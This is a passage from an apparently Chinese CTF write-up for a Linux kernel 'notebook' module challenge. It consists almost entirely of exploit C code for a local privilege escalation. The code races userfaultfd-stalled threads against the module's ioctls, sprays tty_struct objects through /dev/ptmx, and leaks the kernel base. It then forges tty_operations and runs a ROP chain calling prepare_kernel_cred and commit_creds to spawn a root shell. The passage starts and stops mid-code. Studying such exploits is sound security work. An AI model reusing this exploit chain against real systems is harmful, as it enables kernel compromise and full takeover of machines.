class="hljs-string">&quot;\033[32m\033[1m[+] Notebook initialization done.\033[0m&quot;</span>);<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        <span class="hljs-built_in">pthread_create</span>(&amp;<span class="hljs-type">edit_t</span>, <span class="hljs-literal">NULL</span>, evilEdit, (<span class="hljs-type">void</span>*)i);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Edit threads started.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        <span class="hljs-built_in">sem_post</span>(&amp;sem_edit);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Edit threads trapped in userfaultfd.\033[0m&quot;</span>);<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x80</span>; i++)<br>        tty_fd[i] = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Heap spray for tty done.\033[0m&quot;</span>);<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        <span class="hljs-built_in">pthread_create</span>(&amp;<span class="hljs-type">add_t</span>, <span class="hljs-literal">NULL</span>, evilAdd, (<span class="hljs-type">void</span>*)i);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Add threads started.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        <span class="hljs-built_in">sem_post</span>(&amp;sem_add);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Add threads trapped in userfaultfd.\033[0m&quot;</span>);<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">noteGift</span>((<span class="hljs-type">char</span>*) notebook);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">read</span>(note_fd, tty_data, i);<br>        <span class="hljs-keyword">if</span> (hit_tty = (*((<span class="hljs-type">int</span>*)tty_data) == <span class="hljs-number">0x5401</span>))<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully hit the tty_struct at idx \033[0m%d.\n&quot;</span>, tty_idx = i);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the tty_struct: \033[0m%p.\n&quot;</span>, notebook[i].buf);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!hit_tty)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;Failed to hit the tty struct.&quot;</span>);<br><br>    tty_ops = *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>*)(tty_data + <span class="hljs-number">3</span>);<br>    kernel_offset = ((tty_ops &amp; <span class="hljs-number">0xfff</span>) == (PTY_UNIX98_OPS &amp; <span class="hljs-number">0xfff</span>) ? (tty_ops - PTY_UNIX98_OPS) : tty_ops - PTM_UNIX98_OPS);<br>    kernel_base = (<span class="hljs-type">void</span>*) ((<span class="hljs-type">size_t</span>)kernel_base + kernel_offset);<br><br>    prepare_kernel_cred = PREPARE_KERNEL_CRED + kernel_offset;<br>    commit_creds = COMMIT_CREDS + kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Kernel offset: \033[0m0x%llx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel base: \033[0m%p\n&quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] prepare_kernel_cred: \033[0m%p\n&quot;</span>, prepare_kernel_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] commit_creds: \033[0m%p\n&quot;</span>, commit_creds);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] swapgs_restore_regs_and_return_to_usermode: \033[0m%p\n&quot;</span>, SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">read</span>(note_fd, tty_data, i);<br>        <span class="hljs-keyword">if</span> (*((<span class="hljs-type">int</span>*)tty_data) != <span class="hljs-number">0x5401</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (fake_tty_ops_idx == <span class="hljs-number">-1</span>)<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Fake tty_operations at idx \033[0m%d.\n&quot;</span>, fake_tty_ops_idx = i);<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Fake stack at idx \033[0m%d.\n&quot;</span>, fake_stack_idx = i);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (fake_tty_ops_idx == <span class="hljs-number">-1</span> || fake_stack_idx == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;Unable to find enough available notes, you\&#x27;re so lucky that you got so many tty_structs.&quot;</span>);<br>    <br>    <span class="hljs-built_in">noteEdit</span>(fake_tty_ops_idx, <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> tty_operations), fake_tty_data);<br>    <span class="hljs-built_in">noteEdit</span>(fake_stack_idx, <span class="hljs-number">0x100</span>, rop);<br>    <span class="hljs-built_in">noteGift</span>((<span class="hljs-type">char</span>*) notebook);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the fake tty_operations: \033[0m%p.\n&quot;</span>, notebook[fake_tty_ops_idx].buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the fake stack: \033[0m%p.\n&quot;</span>, notebook[fake_stack_idx].buf);<br><br>    <span class="hljs-built_in">read</span>(note_fd, tty_data, tty_idx);<br>    <span class="hljs-built_in">memcpy</span>(fake_tty_data, tty_data, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">0x200</span>);<br><br>    ((<span class="hljs-keyword">struct</span> tty_operations *)fake_tty_ops_data)-&gt;write = PUSH_RDI_POP_RSP_POP_RBP_ADD_RAX_RDX_RET + kernel_offset;<br><br>    fake_tty_data[<span class="hljs-number">1</span>] = POP_RBX_POP_RBP_RET + kernel_offset;<br>    fake_tty_data[<span class="hljs-number">3</span>] = notebook[fake_tty_ops_idx].buf;<br>    fake_tty_data[<span class="hljs-number">4</span>] = MOV_RSP_RBP_POP_RBP_RET + kernel_offset;<br><br>    fake_tty_ops_data[<span class="hljs-number">1</span>] = POP_RBP_RET + kernel_offset;<br>    fake_tty_ops_data[<span class="hljs-number">2</span>] = notebook[fake_stack_idx].buf;<br>    fake_tty_ops_data[<span class="hljs-number">3</span>] = MOV_RSP_RBP_POP_RBP_RET + kernel_offset;<br><br>    <span class="hljs-type">int</span> rop_idx = <span class="hljs-number">0</span>;<br>    rop[rop_idx++] = <span class="hljs-number">0xdeadbeefdeadbeef</span>; <span class="hljs-comment">//for pop rbp, not useful;</span><br>    rop[rop_idx++] = POP_RDI_RET + kernel_offset;<br>    rop[rop_idx++] = <span class="hljs-number">0</span>;<br>    rop[rop_idx++] = prepare_kernel_cred;<br>    <span class="hljs-comment">// rop[rop_idx++] = POP_RDX_RET + kernel_offset;</span><br>    <span class="hljs-comment">// rop[rop_idx++] = RET;</span><br>    rop[rop_idx++] = MOV_RDI_RAX_POP_RBP_RET + kernel_offset;<br>    rop[rop_idx++] = <span class="hljs-number">0xdeadbeefdeadbeef</span>; <br>    rop[rop_idx++] = commit_creds;<br>    rop[rop_idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">22</span> + kernel_offset;<br>    rop[rop_idx++] = <span class="hljs-number">0</span>;<br>    rop[rop_idx++] = <span class="hljs-number">0</span>;<br>    rop[rop_idx++] = (<span class="hljs-type">size_t</span>) &amp;getRootShell;<br>    rop[rop_idx++] = user_cs;<br>    rop[rop_idx++] = user_rflags;<br>    rop[rop_idx++] = user_sp;<br>    rop[rop_idx++] = user_ss;<br><br>    <span class="hljs-built_in">write</span>(note_fd, rop, fake_stack_idx);                    <span class="hljs-comment">// copy the ropchain</span><br>    <span class="hljs-built_in">write</span>(note_fd, fake_tty_ops_data, fake_tty_ops_idx);    <span class="hljs-comment">// hijack the tty_operations</span><br>    <span class="hljs-built_in">write</span>(note_fd, fake_tty_data, tty_idx);                 <span class="hljs-comment">// hijack the tty_struct</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] TTY DATA hijack done.\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x80</span>; i++)<br>        <span class="hljs-built_in">write</span>(tty_fd[i], page, <span class="hljs-number">233</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>解法二exp</strong></p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTM_UNIX98_OPS 0xffffffff81e8e440</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTY_UNIX98_OPS 0xffffffff81e8e320</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810a9b40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a9ef0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a00929</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSH_RDI_POP_RSP_POP_RBP_ADD_RAX_RDX_RET 0xffffffff81238d50</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RSP_RBP_POP_RBP_RET 0xffffffff8107875c</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81007115</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RDI_RAX_POP_RBP_RET 0xffffffff81045833</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDX_RET 0xffffffff81358842</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RET 0xffffffff81000091</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POP_RBP_RET 0xffffffff810637d4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IRETQ 0xffffffff810338bb</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDX_POP_R12_POP_RBP_RET 0xffffffff810880c1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RSI_POP_RDI_POP_RBX_RET 0xffffffff81079c38</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RBP_RET 0xffffffff81000367</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RBX_POP_RBP_RET 0xffffffff81002141</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RAX_POP_RBX_POP_RBP_RET 0xffffffff810cadf7</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> WORK_FOR_CPU_FN 0xffffffff8109eb90</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span><br><br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> page_size;<br><span class="hljs-type">static</span> <span class="hljs-type">sem_t</span> sem_add, sem_edit;<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> * buf; <span class="hljs-comment">// for userfaultfd</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *page = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffd_msg</span> msg;<br>    <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffdio_copy</span> uffdio_copy;<br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">pollfd</span> pollfd;<br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = <span class="hljs-built_in">poll</span>(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = <span class="hljs-built_in">read</span>(uffd, &amp;msg, <span class="hljs-built_in">sizeof</span>(msg));<br><br>        <span class="hljs-built_in">sleep</span>(<span class="hljs-number">100</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <br>&#123;<br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">char</span> * buf;<br>&#125; Note;<br><br><span class="hljs-type">long</span> note_fd;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">noteAdd</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    <span class="hljs-built_in">ioctl</span>(note_fd, <span class="hljs-number">0x100</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">noteAddWrapper</span><span class="hljs-params">(<span class="hljs-type">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note * note = (Note*) args;<br>    <span class="hljs-built_in">noteAdd</span>(note-&gt;idx, note-&gt;size, note-&gt;buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">noteDel</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .idx = idx,<br>    &#125;;<br>    <span class="hljs-built_in">ioctl</span>(note_fd, <span class="hljs-number">0x200</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">noteEdit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    <span class="hljs-built_in">ioctl</span>(note_fd, <span class="hljs-number">0x300</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">noteEditWrapper</span><span class="hljs-params">(<span class="hljs-type">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note * note = (Note*) args;<br>    <span class="hljs-built_in">noteEdit</span>(note-&gt;idx, note-&gt;size, note-&gt;buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">noteGift</span><span class="hljs-params">(<span class="hljs-type">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .buf = buf,<br>    &#125;;<br>    <span class="hljs-built_in">ioctl</span>(note_fd, <span class="hljs-number">100</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">evilAdd</span><span class="hljs-params">(<span class="hljs-type">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">sem_wait</span>(&amp;sem_add);<br>    <span class="hljs-built_in">noteAdd</span>((<span class="hljs-type">int</span>)args, <span class="hljs-number">0x50</span>, buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">evilEdit</span><span class="hljs-params">(<span class="hljs-type">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">sem_wait</span>(&amp;sem_edit);<br>    <span class="hljs-built_in">noteEdit</span>((<span class="hljs-type">int</span>)args, <span class="hljs-number">0x2000</span>, buf);<br>&#125;<br><br><span class="hljs-keyword">struct</span><br>&#123;<br>    <span class="hljs-type">void</span> * buf;<br>    <span class="hljs-type">size_t</span> size;<br>&#125; notebook[<span class="hljs-number">0x10</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> tty_fd[<span class="hljs-number">0x100</span>], tty_idx, fake_tty_ops_idx = <span class="hljs-number">-1</span>, fake_stack_idx = <span class="hljs-number">-1</span>, hit_tty = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">size_t</span> tty_data[<span class="hljs-number">0x200</span>], fake_tty_data[<span class="hljs-number">0x200</span>], tty_ops, fake_tty_ops_data[<span class="hljs-number">0x200</span>], rop[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">pthread_t</span> <span class="hljs-type">tmp_t</span>, <span class="hljs-type">add_t</span>, <span class="hljs-type">edit_t</span>;<br>    Note note;<br>    <span class="hljs-built_in">saveStatus</span>();<br>    <span class="hljs-built_in">sem_init</span>(&amp;sem_add, 